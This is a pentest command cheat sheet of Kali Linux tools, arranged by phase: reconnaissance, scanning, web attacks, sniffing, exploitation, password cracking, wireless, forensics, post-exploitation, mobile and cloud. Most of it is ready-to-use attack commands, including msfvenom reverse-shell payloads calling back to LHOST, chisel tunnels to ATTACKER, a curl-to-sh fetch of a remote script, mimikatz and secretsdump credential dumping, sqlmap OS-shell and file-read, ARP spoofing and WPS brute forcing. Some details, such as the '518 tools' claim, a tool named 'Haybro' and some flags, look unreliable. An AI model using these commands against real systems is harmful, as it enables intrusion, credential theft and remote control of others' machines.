# Tool Mastery — Payloads & Commands

This document provides comprehensive command references for all 518 Kali Linux security tools organized by category. Each section includes practical commands for core tools with common flags and usage patterns for different scenarios.

## Reconnaissance Tools

Reconnaissance tools gather information about targets through passive and semi-passive techniques. These tools make minimal or no direct contact with the target, reducing detection risk during the initial intelligence gathering phase.

### Subdomain Enumeration

```bash
# subfinder — fast passive subdomain enumeration
subfinder -d TARGET -all -v -o subs.txt
subfinder -d TARGET -r 8.8.8.8,1.1.1.1 -t 10 -timeout 30 -o subs.txt
subfinder -d TARGET -config ~/.config/subfinder/provider-config.yaml -o subs.txt

# amass — deep subdomain enumeration with active/passive modes
amass enum -passive -d TARGET -o amass_passive.txt
amass enum -active -d TARGET -brute -o amass_active.txt
amass enum -d TARGET -config ~/.config/amass.ini -o amass_custom.txt
amass db -show -d TARGET

# dnsenum — DNS enumeration and zone transfer
dnsenum TARGET --dnsserver 8.8.8.8 --enum -f /usr/share/wordlists/dns.txt
dnsenum TARGET --threads 10 -o dnsenum_output.xml
```

### Technology Fingerprinting

```bash
# whatweb — web technology identification
whatweb -v -a 3 https://TARGET
whatweb -v https://TARGET --color=never -o whatweb_output.txt
whatweb -a 3 -H "User-Agent: Mozilla/5.0" https://TARGET

# wappalyzer — technology detection via CLI
wappalyzer https://TARGET --pretty

# webanalyze — Go-based Wappalyzer clone for bulk analysis
webanalyze -host TARGET -crawl 2 -output json
cat urls.txt | webanalyze -silent -output csv
```

### HTTP Probing and URL Discovery

```bash
# httpx — fast HTTP probing
cat subs.txt | httpx -status-code -title -tech-detect -content-length -o alive.txt
cat subs.txt | httpx -ports 80,443,8080,8443 -follow-redirects -o alive_full.txt
cat subs.txt | httpx -status-code -cdn -rate-limit 50 -o alive_cdn.txt

# waybackurls — historical URL discovery from Wayback Machine
waybackurls TARGET | sort -u > wayback_urls.txt
echo TARGET | waybackurls | grep -E "\.(js|json|xml|conf|bak)" > interesting_urls.txt

# gau — getallurls from multiple sources
gau TARGET | sort -u > gau_urls.txt
gau TARGET --subs --threads 10 --o gau_subs.txt
gau TARGET --fc 404 --o gau_filtered.txt

# katana — crawling and spidering framework
katana -u TARGET -d 3 -jc -aff -o katana_urls.txt
katana -u TARGET -d 5 -js-crawl -known-files all -o katana_deep.txt
katana -list urls.txt -d 2 -crawl-scope TARGET -o katana_batch.txt
```

### OSINT and Email Harvesting

```bash
# theHarvester — email and subdomain harvesting
theHarvester -d TARGET -b all -l 500 -o harvester_output.txt
theHarvester -d TARGET -b google,bing,linkedin -l 200
theHarvester -d TARGET -b dnsdumpster,rapiddns -f json

# metagoofil — document metadata extraction
metagoofil -d TARGET -t pdf,doc,xls,ppt -l 50 -n 20 -o metadata_output/
metagoofil -d TARGET -t pdf -l 100 -n 50 -u "Mozilla/5.0"

# emailfinder — email pattern discovery
emailfinder -d TARGET -o emails.txt
```

### DNS Analysis

```bash
# dnsrecon — DNS enumeration and reconnaissance
dnsrecon -d TARGET -t std -o dnsrecon_std.txt
dnsrecon -d TARGET -t axfr
dnsrecon -d TARGET -t brt -D /usr/share/wordlists/dns.txt
dnsrecon -d TARGET -t snoop -n TARGET_DNS -D /usr/share/wordlists/dns.txt

# dig — DNS lookup utility
dig TARGET ANY +noall +answer
dig TARGET AXFR @TARGET_DNS
dig -x IP_ADDRESS +short

# fierce — DNS reconnaissance and subdomain brute-forcing
fierce --domain TARGET --subfile /usr/share/wordlists/dns.txt
fierce --domain TARGET --dns-servers 8.8.8.8 --range 192.168.1.0/24
```

## Scanning Tools

Scanning tools perform active probing of targets to discover open ports, running services, and potential vulnerabilities. These tools generate network traffic and are detectable by security monitoring systems.

### Port Scanning

```bash
# nmap — network exploration and security auditing (comprehensive)
nmap -sS -sV -sC -O -p- -T4 TARGET -oA fullscan
nmap -sS -T2 -f -D RND:10 -p 1-1000 TARGET -oA stealth_scan
nmap -sU -p 53,67,68,123,161,162,500,514 -T4 TARGET -oA udp_scan
nmap -sV --version-intensity 5 -p 80,443,8080,8443 TARGET -oA service_scan
nmap --script vuln -p 80,443 TARGET -oA vuln_scan
nmap --script auth-brute -p 22,21,23 TARGET -oA brute_scan
nmap -sS -p- --min-rate 5000 TARGET -oA fast_scan
nmap -6 -sS -p- TARGET_IPV6 -oA ipv6_scan

# masscan — mass IP port scanner for fast discovery
masscan -p1-65535 --rate=10000 TARGET -oL masscan_results.txt
masscan -p80,443,8080 --rate=100000 10.0.0.0/8 -oL web_ports.txt
masscan -p1-65535 --rate=5000 TARGET --excludefile exclude.txt -oL scan.txt
masscan -p1-65535 --rate=10000 TARGET -oX masscan_results.xml

# rustscan — modern fast port scanner
rustscan -a TARGET -- -sV -sC -oA rustscan_output
rustscan -a TARGET -t 2000 -b 500 -- -sV -sC
rustscan -a targets.txt --ulimit 5000 -- -sS -sV
```

### Vulnerability Scanning

```bash
# nuclei — fast vulnerability scanner with templates
nuclei -u TARGET -t cves/ -t vulnerabilities/ -severity critical,high -o nuclei_critical.txt
nuclei -l urls.txt -t cves/ -t misconfiguration/ -c 50 -o nuclei_batch.txt
nuclei -u TARGET -t exposures/ -t tokens/ -severity low,medium,high,critical
nuclei -u TARGET -t fuzzing/ -t headless/ -rl 100 -bs 25
nuclei -u TARGET -t cves/2024/ -t cves/2025/ -severity critical -o recent_cves.txt
nuclei -u TARGET -w /usr/share/nuclei-templates/workflows/ -o workflow_results.txt

# nikto — web server scanner
nikto -h TARGET -Tuning 12345678 -o nikto_output.txt
nikto -h TARGET -ssl -port 443 -Tuning 1,2,3 -o nikto_ssl.txt
nikto -h TARGET -Cgidirs /admin,/backup -o nikto_dirs.txt
nikto -h TARGET -evasion 1 -Tuning 6 -o nikto_evasion.txt

# testssl — SSL/TLS security testing
testssl TARGET --full --openssl --htmlfile testssl_report.html
testssl TARGET --protocols --vulnerable --severity HIGH
testssl TARGET --ciphers --client-simulation --jsonfile testssl_results.json
testssl TARGET --heartbleed --poodle --freak --logjam
```

## Web Application Tools

Web application tools focus on discovering and exploiting vulnerabilities in web-based applications including injection flaws, authentication issues, access control problems, and misconfigurations.

### SQL Injection

```bash
# sqlmap — automated SQL injection detection and exploitation
sqlmap -u "TARGET/page?id=1" --batch --dbs --level=3 --risk=2
sqlmap -u "TARGET/page?id=1" --batch --os-shell --technique=BEUSTQ
sqlmap -r request.txt --batch --dbs --tamper=space2comment,between
sqlmap -u "TARGET/page?id=1" --batch --dump -D dbname -T tablename
sqlmap -u "TARGET/api/endpoint" --batch --method=POST --data='{"id":"1"}' --level=5
sqlmap -u "TARGET/page?id=1" --batch --sql-shell --technique=U
sqlmap -u "TARGET/page?id=1" --batch --file-read=/etc/passwd --technique=U
sqlmap -u "TARGET/login" --batch --forms --crawl=2 --level=3

# commix — command injection exploitation
commix --url="TARGET/page?cmd=test" --batch
commix --url="TARGET/page" --data="cmd=test" --technique=T
```

### Cross-Site Scripting (XSS)

```bash
# dalfox — powerful XSS scanner
dalfox url TARGET --blind https://BLIND.xss.ht
dalfox url TARGET -H "Cookie: session=abc123" --skip-mining-dom
dalfox url TARGET --skip-headless --delay 100 --timeout 10
dalfox file urls.txt --multicast 10 -o xss_results.txt
dalfox url TARGET --remote-payloads portswigger,burp --skip-grepping

# xsstrike — advanced XSS detection
xsstrike -u TARGET --crawl --blind
xsstrike -u TARGET --fuzzer --payloads xss_payloads.txt
xsstrike -u TARGET --headers "Cookie: session=abc" --delay 1
```

### Directory and File Discovery

```bash
# ffuf — fast web fuzzer for directories, subdomains, and parameters
ffuf -u TARGET/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302 -o ffuf_dirs.json
ffuf -u TARGET/FUZZ -w /usr/share/wordlists/dirb/common.txt -x php,html,js,txt,bak -mc 200,301,302
ffuf -u TARGET -H "Host: FUZZ.TARGET" -w /usr/share/wordlists/dns.txt -mc 200,301
ffuf -u TARGET/page?FUZZ=value -w /usr/share/wordlists/params.txt -mc 200,500
ffuf -u TARGET/login -X POST -d "user=admin&pass=FUZZ" -w /usr/share/wordlists/rockyou.txt -mc 200,302 -fc 401
ffuf -u TARGET/FUZZ -w wordlist.txt -H "Authorization: Bearer TOKEN" -mc 200

# gobuster — directory and DNS brute-forcing
gobuster dir -u TARGET -w /usr/share/wordlists/dirb/common.txt -x php,html,js -t 50
gobuster dir -u TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k --no-error
gobuster dns -d TARGET -w /usr/share/wordlists/dns.txt -t 25
gobuster vhost -u TARGET -w /usr/share/wordlists/dns.txt --append-domain
gobuster fuzz -u TARGET/FUZZ -w /usr/share/wordlists/dirb/common.txt -b 404,403

# feroxbuster — recursive content discovery
feroxbuster -u TARGET -w /usr/share/wordlists/dirb/common.txt -x php,html,js -d 2
feroxbuster -u TARGET -w wordlist.txt -H "Cookie: session=abc" -t 50 --time-limit 10m
feroxbuster -u TARGET --depth 3 --filter-status 200,301,302 --extract-links
```

### API Testing

```bash
# kiterunner — API endpoint discovery
kiterunner scan TARGET -x 20 -w routes.kite -o kiterunner_results.txt
kiterunner scan TARGET -x 30 -w /usr/share/wordlists/api/routes.txt

# arjun — HTTP parameter discovery
arjun -u TARGET/endpoint -m GET,POST -o arjun_params.json
arjun -u TARGET/endpoint -H "Authorization: Bearer TOKEN" -t 20
arjun -u TARGET/api/data --include="id,name" --stable

# postman — API testing (CLI with newman)
newman run collection.json -e environment.json --reporters cli,json
newman run collection.json --iteration-count 5 --delay-request 500
```

## Network Analysis Tools

Network analysis tools capture, inspect, and manipulate network traffic for security assessment. These tools are essential for understanding network architecture, identifying vulnerabilities in protocols, and performing man-in-the-middle testing.

### Traffic Capture and Analysis

```bash
# wireshark/tshark — network protocol analyzer
tshark -i eth0 -w capture.pcap
tshark -r capture.pcap -Y "http.request" -T fields -e ip.src -e http.host -e http.request.uri
tshark -r capture.pcap -Y "tcp.flags.syn==1 && tcp.flags.ack==0" -T fields -e ip.src -e ip.dst -e tcp.dstport
tshark -i eth0 -f "port 80 or port 443" -w web_traffic.pcap
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name -e dns.a
tshark -r capture.pcap -Y "tcp.analysis.retransmission" -T fields -e ip.src -e ip.dst

# tcpdump — packet capture utility
tcpdump -i eth0 -nn -s0 -w capture.pcap
tcpdump -i eth0 port 80 -A -s0 | grep -i "user-agent\|cookie\|authorization"
tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn) != 0' -nn -c 100
tcpdump -i eth0 host TARGET and port 443 -w https_capture.pcap
tcpdump -r capture.pcap -nn -q
```

### Network Sniffing

```bash
# ettercap — man-in-the-middle attack suite
ettercap -T -M arp:remote /TARGET// /ROUTER// -q -i eth0
ettercap -T -q -i eth0 -L ettercap_log -M arp:remote /TARGET// //

# bettercap — network attack and monitoring framework
bettercap -iface eth0
net.probe on
net.sniff on
set arp.spoof.targets TARGET_IP
arp.spoof on
net.sniff on

# responder — LLMNR/NBT-NS/MDNS poisoner
responder -I eth0 -wrf
responder -I eth0 -b -f -w -r
```

### Network Mapping

```bash
# traceroute — network path discovery
traceroute TARGET
traceroute -6 TARGET_IPV6
traceroute -T -p 443 TARGET

# netdiscover — network host discovery
netdiscover -r 192.168.1.0/24
netdiscover -i eth0 -r 10.0.0.0/24

# arp-scan — ARP-based network scanning
arp-scan -l -I eth0
arp-scan 192.168.1.0/24 -I eth0
```

## Exploitation Tools

Exploitation tools leverage discovered vulnerabilities to gain unauthorized access or execute arbitrary code. These tools require careful authorization and scope verification before use.

### Metasploit Framework

```bash
# msfconsole — primary Metasploit interface
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST LOCAL; set LPORT 4444; run"
msfconsole -x "use exploit/unix/webapp/wp_admin_shell_upload; set RHOSTS TARGET; run"
msfconsole -r auto_exploit.rc

# msfvenom — payload generation
msfvenom -p windows/meterpreter/reverse_tcp LHOST=LOCAL LPORT=4444 -f exe -o payload.exe
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=LOCAL LPORT=4444 -f elf -o payload.elf
msfvenom -p windows/meterpreter/reverse_https LHOST=LOCAL LPORT=443 -f ps1 -o payload.ps1
msfvenom -p php/meterpreter/reverse_tcp LHOST=LOCAL LPORT=4444 -f raw -o payload.php
msfvenom -p python/meterpreter/reverse_tcp LHOST=LOCAL LPORT=4444 -f raw -o payload.py
msfvenom -p cmd/windows/reverse_tcp LHOST=LOCAL LPORT=4444 -f bat -o payload.bat
msfvenom -p java/jsp_shell_reverse_tcp LHOST=LOCAL LPORT=4444 -f war -o payload.war

# meterpreter — post-exploitation commands
sysinfo
getuid
getsystem
hashdump
load kiwi
creds_all
upload /local/file /remote/path
download /remote/file /local/path
portfwd add -l LOCAL_PORT -p REMOTE_PORT -r TARGET
route add SUBNET SESSION_ID
```

### Cracking and Brute Force

```bash
# hydra — online password brute forcing
hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
hydra -L users.txt -P passwords.txt TARGET ssh -t 4 -vV
hydra -l root -P passwords.txt TARGET mysql -t 4
hydra -l admin -P passwords.txt TARGET rdp -t 1 -V
hydra -l admin -P passwords.txt TARGET ftp -t 10 -vV
hydra -l admin -P passwords.txt TARGET smb -vV

# hashcat — offline password cracking
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1800 sha512_hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
hashcat -m 22000 hash.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 0 hashes.txt -a 3 ?a?a?a?a?a?a?a?a --force

# john — password cracker
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --format=bcrypt hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --show hashes.txt
```

### Network Exploitation

```bash
# crackmapexec — network exploitation and post-exploitation
crackmapexec smb TARGET -u user -p pass --shares
crackmapexec smb TARGET -u user -p pass --sam
crackmapexec smb TARGET -u user -p pass --lsa
crackmapexec smb TARGET -u user -p pass --exec-method smbexec -x "whoami"
crackmapexec smb SUBNET -u user -p pass --local-auth
crackmapexec ssh TARGET -u user -p pass --execCmd "id"
crackmapexec winrm TARGET -u user -p pass -x "whoami"

# impacket — collection of Python classes for network protocols
impacket-psexec DOMAIN/user:pass@TARGET
impacket-smbexec DOMAIN/user:pass@TARGET
impacket-wmiexec DOMAIN/user:pass@TARGET
impacket-secretsdump DOMAIN/user:pass@TARGET -outputfile dumps
impacket-ntlmrelayx -tf targets.txt -smb2support
impacket-getTGT DOMAIN/user -hashes LM:NT
impacket-getST -spn cifs/TARGET DOMAIN/user -impersonate administrator
```

## Password Attack Tools

Password attack tools focus on credential extraction, cracking, and brute-forcing. These tools work with both online (live services) and offline (hash files) attack modes.

### Offline Hash Cracking

```bash
# hashcat — GPU-accelerated password recovery
hashcat -m 0 -a 0 md5_hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1800 -a 0 sha512_hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 2500 -a 0 capture.hccapx /usr/share/wordlists/rockyou.txt --force
hashcat -m 3200 -a 0 bcrypt_hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 0 -a 0 hashes.txt wordlist.txt -r rules/best64.rule -r rules/d3ad0ne.rule --force

# john the ripper — password cracker with format support
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt hashes.txt
john --incremental --format=raw-md5 hashes.txt
john --show --format=raw-md5 hashes.txt

# hashid — hash type identification
hashid HASH_VALUE
hashid -m HASH_VALUE
hashid HASH_VALUE -o hash_type.txt
```

### Online Brute Forcing

```bash
# hydra — parallelized login brute-forcing
hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET http-post-form "/login:user=^USER^&pass=^PASS^:S=Welcome:F=Invalid"
hydra -L users.txt -P passwords.txt TARGET ssh -t 4 -W 3 -vV
hydra -l root -P passwords.txt -e nsr TARGET ssh
hydra -l admin -P passwords.txt TARGET ftp -t 10 -o hydra_ftp_results.txt
hydra -l admin -P passwords.txt TARGET mysql -t 4 -vV

# medusa — parallel login brute-forcing
medusa -h TARGET -u admin -P passwords.txt -M ssh -t 4
medusa -h TARGET -U users.txt -P passwords.txt -M http -m DIR:/login -T 4
medusa -h TARGET -u admin -P passwords.txt -M rdp -t 1

# patator — multi-purpose brute-forcer
patator ssh_login host=TARGET user=admin password=FILE0 0=passwords.txt -x ignore:mesg='Authentication failed'
patator http_fuzz url=TARGET/login method=POST body='user=admin&pass=FILE0' 0=passwords.txt -x ignore:fgrep='Invalid'
```

## Wireless Tools

Wireless tools target WiFi, Bluetooth, and RF-based networks for security assessment. These tools require compatible wireless adapters with monitor mode and packet injection capabilities.

### WiFi Assessment

```bash
# aircrack-ng suite — complete WiFi assessment toolkit
airmon-ng check kill
airmon-ng start wlan0
airodump-ng wlan0mon -w capture -c CHANNEL --bssid TARGET_BSSID
aireplay-ng -0 10 -a TARGET_BSSID -c CLIENT_MAC wlan0mon
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
airmon-ng stop wlan0mon

# wifite — automated wireless auditing
wifite --kill --dict /usr/share/wordlists/rockyou.txt
wifite -e TARGET_SSID --dict /usr/share/wordlists/rockyou.txt
wifite -c 6 --kill --pow 50

# reaver — WPS brute-force attack
reaver -i wlan0mon -b TARGET_BSSID -vv -K 1
reaver -i wlan0mon -b TARGET_BSSID -S -vv -d 5

# bully — WPS brute-force alternative
bully wlan0mon -b TARGET_BSSID -c CHANNEL -v 3
bully wlan0mon -b TARGET_BSSID -c CHANNEL -l 1 -L -v 3
```

### Bluetooth and RFID

```bash
# btscanner — Bluetooth scanner
btscanner -i hci0

# spooftooph — Bluetooth device spoofing
spooftooph -i hci0 -a TARGET_MAC -n TARGET_NAME

# proxmark3 — RFID/NFC tool
proxmark3> hf search
proxmark3> hf mf fchk 1
proxmark3> lf search
```

## Forensics and Reverse Engineering Tools

Forensics tools extract and analyze digital artifacts from disk images, memory dumps, and network captures. Reverse engineering tools disassemble and analyze binary executables to understand their behavior.

### Disk and File Forensics

```bash
# autopsy — digital forensics platform (GUI-based)
autopsy &

# binwalk — firmware analysis and extraction
binwalk -e firmware.bin
binwalk --dd='.*' firmware.bin
binwalk -Me firmware.bin

# foremost — file carving from disk images
foremost -i disk_image.dd -o recovered_files/
foremost -i disk_image.dd -t pdf,doc,jpg,png -o recovered_specific/

# scalpel — file carving tool
scalpel -c /etc/scalpel/scalpel.conf -o carved_output/ disk_image.dd

# testdisk — data recovery
testdisk disk_image.dd

# photorec — file recovery from digital media
photorec disk_image.dd
photorec /dev/sdb1
```

### Memory Forensics

```bash
# volatility — memory forensics framework
vol.py -f memory.dmp imageinfo
vol.py -f memory.dmp --profile=Win10x64 pslist
vol.py -f memory.dmp --profile=Win10x64 netscan
vol.py -f memory.dmp --profile=Win10x64 hashdump
vol.py -f memory.dmp --profile=Win10x64 mimikatz
vol.py -f memory.dmp --profile=Win10x64 filescan | grep -i "password\|secret\|key"
vol.py -f memory.dmp --profile=Win10x64 consoles

# volatility3 — next-generation memory forensics
vol -f memory.dmp windows.info
vol -f memory.dmp windows.pslist
vol -f memory.dmp windows.netscan
vol -f memory.dmp windows.hashdump
vol -f memory.dmp windows.memmap --pid PID --dump
```

### Binary Analysis

```bash
# ghidra — software reverse engineering suite (GUI)
ghidra &

# radare2 — reverse engineering framework
r2 -A binary_file
r2 -A binary_file -c "afl; pdf @main; q"

# strings — extract printable strings
strings -n 8 binary_file | grep -i "password\|key\|secret\|http\|https"
strings -n 8 binary_file | sort -u > strings_output.txt

# file — file type identification
file binary_file
file -z compressed_file.gz

# objdump — binary analysis
objdump -d binary_file | head -200
objdump -t binary_file | grep -i "main\|auth\|check"

# ltrace — library call tracing
ltrace ./binary_file
ltrace -s 200 -o ltrace_output.txt ./binary_file

# strace — system call tracing
strace ./binary_file 2>&1 | grep -i "open\|read\|write\|connect"
strace -f -o strace_output.txt ./binary_file
```

## Post-Exploitation Tools

Post-exploitation tools operate after initial access is gained, focusing on privilege escalation, lateral movement, persistence, and data extraction. These tools require careful evidence handling and scope awareness.

### Privilege Escalation

```bash
# linpeas — Linux privilege escalation enumeration
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
./linpeas.sh -a 2>&1 | tee linpeas_output.txt
./linpeas.sh -a -o system_files 2>&1 | tee linpeas_system.txt

# winpeas — Windows privilege escalation enumeration
winpeas.exe fast cmd
winpeas.exe cmd servicesinfo
winpeas.exe cmd systeminfo

# linux-smart-enumeration (lse)
./lse.sh -l 2 -i | tee lse_output.txt
./lse.sh -l 3 -s 422 | tee lse_deep.txt

# linux exploit suggester
./linux-exploit-suggester.sh --uname "KERNEL_VERSION"
./linux-exploit-suggester.sh --full -k KERNEL_VERSION
```

### Credential Extraction

```bash
# mimikatz — Windows credential extraction
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
mimikatz.exe "privilege::debug" "lsadump::sam" "exit"
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:DOMAIN /user:administrator" "exit"
mimikatz.exe "privilege::debug" "sekurlsa::wdigest" "exit"
mimikatz.exe "privilege::debug" "kerberos::list /export" "exit"

# lazagne — password recovery from local storage
lazagne.exe all
lazagne.exe browsers
lazagne.exe windows
python3 laZagne.py all -oN lazagne_output.txt

# impacket-secretsdump — remote secret dumping
impacket-secretsdump DOMAIN/user:pass@TARGET -outputfile secrets_dump
impacket-secretsdump LOCAL -system SYSTEM -security SECURITY -sam SAM
```

### Tunneling and Pivoting

```bash
# chisel — TCP/UDP tunnel over HTTP
chisel server --reverse -p 8080   # attacker machine
chisel client ATTACKER:8080 R:socks                # dynamic SOCKS proxy
chisel client ATTACKER:8080 R:8081:INTERNAL:80     # port forward

# ligolo-ng — tunneling and pivoting tool
ligolo-proxy -selfcert -laddr 0.0.0.0:11601
ligolo-agent -connect ATTACKER:11601 -ignore-cert
# In proxy console: ifconfig, listener_add, start

# proxychains — proxy chaining for tools
proxychains nmap -sT -Pn INTERNAL_TARGET
proxychains curl http://INTERNAL_TARGET
proxychains4 crackmapexec smb INTERNAL_SUBNET -u user -p pass

# socat — relay tool for port forwarding
socat TCP-LISTEN:8080,fork TCP:INTERNAL_TARGET:80
socat TCP-LISTEN:8888,reuseaddr,fork TCP:INTERNAL:3389
socat UDP-LISTEN:53,fork UDP:DNS_SERVER:53

# ssh tunneling
ssh -L LOCAL_PORT:INTERNAL:REMOTE_PORT user@TARGET
ssh -D 9050 -N -f user@TARGET
ssh -R REMOTE_PORT:localhost:LOCAL_PORT user@TARGET
```

### Lateral Movement

```bash
# crackmapexec — lateral movement across network
crackmapexec smb SUBNET -u user -p pass --exec-method smbexec -x "whoami"
crackmapexec smb SUBNET -u user -H NTLM_HASH --shares
crackmapexec smb TARGET -u user -p pass --sam --lsa
crackmapexec ssh SUBNET -u user -p pass --execCmd "hostname"
crackmapexec smb TARGET -u user -p pass --wdigest enable

# impacket-psexec — remote command execution
impacket-psexec DOMAIN/admin:pass@TARGET
impacket-psexec DOMAIN/admin@TARGET -hashes LM:NT
impacket-smbexec DOMAIN/user:pass@TARGET
impacket-wmiexec DOMAIN/user:pass@TARGET

# evil-winrm — WinRM shell
evil-winrm -i TARGET -u administrator -p password
evil-winrm -i TARGET -u administrator -H NTLM_HASH
evil-winrm -i TARGET -c cert.pem -k key.pem -S
```

## Crypto and Steganography Tools

Crypto tools analyze and break cryptographic implementations. Steganography tools detect and extract hidden data within files.

### Cryptography Analysis

```bash
# openssl — SSL/TLS toolkit: certificate analysis
openssl s_client -connect TARGET:443 -showcerts
openssl x509 -in cert.pem -text -noout
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365
```

```bash
# openssl — encryption and decryption operations
openssl enc -d -aes-256-cbc -in encrypted.file -out decrypted.file -pass pass:PASSWORD
openssl enc -aes-256-cbc -salt -in plaintext.txt -out encrypted.txt -pass pass:PASSWORD
openssl dgst -sha256 file.txt
openssl rsa -in key.pem -check
```

```bash
# hashid — identify hash types automatically
hashid HASH_VALUE
hashid HASH_VALUE -m -o hash_types.txt
hashid -e '$6$' HASH_VALUE
```

```bash
# rsatool — RSA key recovery from components
python3 rsatool.py -f PEM -o recovered_key.pem -n MODULUS -e EXPONENT -p FACTOR_P -q FACTOR_Q
python3 rsatool.py -f DER -o key.der -n MODULUS -e 65537 -p PRIME_P -q PRIME_Q
```

```bash
# pkcrack — ZIP encryption cracking with known plaintext
pkcrack -C encrypted.zip -c file_in_archive -P plain.zip -p same_file_in_plain
pkcrack -C encrypted.zip -c file.txt -P plain.zip -p file.txt -d decrypted.zip
```

### Steganography

```bash
# steghide — extract embedded data from images
steghide extract -sf image.jpg -p PASSWORD
steghide extract -sf image.bmp
steghide info image.jpg
```

```bash
# steghide — embed data into images
steghide embed -cf image.jpg -ef secret.txt -p PASSWORD
steghide embed -cf cover.bmp -ef payload.txt -sf stego_output.bmp
```

```bash
# stegcracker — brute-force steganography passwords
stegcracker image.jpg /usr/share/wordlists/rockyou.txt
stegcracker image.png wordlist.txt -o extracted_data.txt
```

```bash
# zsteg — PNG/BMP steganography detection across bit planes
zsteg image.png
zsteg -a image.png
zsteg -o 1b image.png
```

```bash
# exiftool — metadata analysis and extraction
exiftool image.jpg
exiftool -all image.jpg | grep -i "comment\|description\|artist"
exiftool -Comment="test" image.jpg
```

```bash
# binwalk — detect embedded files and code in any binary
binwalk image.png
binwalk -e image.png
binwalk --dd='.*' suspicious_file.bin
```

## Mobile Security Tools

Mobile security tools analyze Android and iOS applications for vulnerabilities, perform dynamic instrumentation, and test mobile APIs.

### Android Analysis

```bash
# frida — dynamic instrumentation toolkit
frida-ps -U
frida -U -n com.target.app -l hook_script.js
frida-trace -U -f com.target.app -i "open\|read\|write"
frida -U -f com.target.app --no-pause -l bypass.js

# objection — runtime exploration toolkit
objection -g com.target.app explore
android root detect disable
android sslpinning disable
android keystore list
memory dump all
sqlite connect /data/data/com.target.app/databases/db.sqlite

# drozer — Android security assessment framework
drozer console connect
run app.package.list -f target
run app.package.info -a com.target.app
run app.activity.info -a com.target.app
run scanner.provider.injection -a com.target.app
run scanner.provider.traversal -a com.target.app

# jadx — Android decompiler
jadx -d output_dir/ target.apk
jadx --no-res --show-bad-code target.apk -d output_dir/

# apktool — Android resource decoder
apktool d target.apk -o decoded/
apktool b decoded/ -o rebuilt.apk

# adb — Android debug bridge
adb devices
adb shell pm list packages | grep target
adb shell dumpsys package com.target.app
adb pull /data/data/com.target.app/databases/db.sqlite ./
adb logcat | grep -i "target\|error\|exception"
```

### iOS Analysis

```bash
# ideviceinstaller — iOS app management
ideviceinstaller -l
ideviceinstaller -i app.ipa

# objection — iOS runtime exploration
objection -g com.target.app explore
ios jailbreak disable
ios sslpinning disable
ios keychain dump
ios nsurlcredentialstorage dump

# frida — iOS instrumentation
frida-ps -Uai
frida -U -n TargetApp -l ios_hook.js
frida-trace -U -n TargetApp -i "NSURLConnection"
```

## Tool Selection Quick Reference

| Task | Primary Tool | Alternative | Stealth Tool |
|------|-------------|-------------|-------------|
| Port scan | nmap -sS | masscan | nmap -sS -T2 -f |
| Dir brute | ffuf | gobuster, feroxbuster | ffuf -rate 10 |
| SQL injection | sqlmap | commix | sqlmap --delay=5 |
| XSS | dalfox | xsstrike | dalfox --delay 200 |
| Password crack | hashcat | john | — |
| Brute force | hydra | medusa, patator | hydra -t 1 -W 5 |
| Tunnel | chisel | ligolo-ng, socat | — |
| Priv esc | linpeas/winpeas | lse, unix-privesc-check | — |
| Memory forensics | volatility | volatility3 | — |
| WiFi audit | aircrack-ng | wifite | — |
| Mobile | frida + objection | drozer | — |
| Binary RE | ghidra | radare2 | — |
| Crypto | openssl | hashid, rsatool | — |
| Stego | steghide | zsteg, exiftool | — |

---

## Cloud Security Tools

### AWS Security Assessment

```bash
# ScoutSuite - AWS security posture assessment
scout aws -p aws_profile --report-dir /tmp/scout_report/

# Prowler - AWS CIS benchmark and security assessment
prowler aws -p default

# Cloudfox - cloud infrastructure enumeration
cloudfox aws -p default all-checks
```

### Azure and GCP Security Tools

```bash
# MicroBurst - Azure security assessment
Import-Module MicroBurst.psm1
Invoke-EnumerateAzureBlobs -Base target

# Haybro - GCP security assessment
haybro gcp --project target-project all
```

## Automation and Orchestration Tools

### Multi-Tool Automation Scripts

```bash
# One-liner recon automation
subfinder -d target.com | httpx -status-code | nuclei -t cves/ -severity critical,high

# Automated full scan pipeline
nmap -sV -oX scan.xml target && faraday-cli import -t nmap -f scan.xml

# Batch password cracking with hashcat
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Tool Output Parsing

```bash
# Parse Nmap XML to JSON for programmatic access
python3 -c "
import xml.etree.ElementTree as ET, json
tree = ET.parse('scan.xml')
hosts = []
for h in tree.findall('.//host'):
    addr = h.find('address').get('addr')
    ports = [{'port': p.get('portid'), 'state': p.find('state').get('state')} for p in h.findall('.//port')]
    hosts.append({'host': addr, 'ports': ports})
print(json.dumps(hosts, indent=2))
"
```

### Container Security Tools

```bash
# Trivy - container image vulnerability scanning
trivy image target-image:latest
trivy image --severity HIGH,CRITICAL target-image:latest

